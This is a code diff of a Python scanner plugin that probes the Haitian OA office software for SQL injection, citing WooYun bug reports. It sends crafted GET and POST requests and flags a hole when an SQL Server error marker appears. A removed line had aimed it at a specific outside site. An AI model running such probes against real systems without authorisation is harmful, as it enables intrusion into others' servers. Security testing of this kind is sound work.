@@ -4,7 +4,7 @@
 '''
 name: 海天OA多处SQL注入
 author: yichin
-refer: 
+refer:
     http://www.wooyun.org/bugs/wooyun-2010-061977
     http://www.wooyun.org/bugs/wooyun-2014-084056
     http://www.wooyun.org/bugs/wooyun-2010-077073
@@ -17,7 +17,7 @@ refer:
     http://www.wooyun.org/bugs/wooyun-2010-081633
     http://www.wooyun.org/bugs/wooyun-2010-082211
     http://www.wooyun.org/bugs/wooyun-2010-085252
-    
+
 description:
     这货真能刷
 '''
@@ -46,6 +46,7 @@ def audit(arg):
         code, head, res, err, _ = curl.curl2(url)
         if ((code == 200) or (code == 500)) and ('WtFaBcMicrosoft SQL Server' in res):
             security_hole("SQL Injection: " + url)
+            return arg
     #POST型
     content_type = 'Content-Type: application/x-www-form-urlencoded'
     url = arg + 'LosePassAction.asp'
@@ -53,7 +54,8 @@ def audit(arg):
     code, head, res, err, _ = curl.curl2(url, post=data, header=content_type)
     if((code == 200) or (code == 500)) and ('WtFaBcMicrosoft SQL Server' in res):
         security_hole('SQL Injection: ' + url + " POST:" +data)
-    
-if __name__ == '__main__':
+
+
+        return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('haitianoa', 'http://www.fzsyxx.com/oa/')[1])
